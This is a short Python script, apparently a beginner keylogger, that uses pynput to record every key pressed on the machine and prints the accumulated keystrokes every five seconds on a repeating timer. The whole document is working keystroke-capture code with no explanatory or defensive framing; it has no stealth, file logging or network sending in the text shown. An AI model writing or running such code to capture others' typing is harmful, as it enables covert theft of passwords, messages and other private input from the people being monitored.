import pynput, threading
log = ''
def processKey(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + ' ' + str(key) + ' '


def report():
    global log
    print(log)
    log = ''
    timer = threading.Timer(5,report)
    timer.start()

keyboard = pynput.keyboard.Listener(on_press=processKey)

with keyboard:
    report()
    keyboard.join()







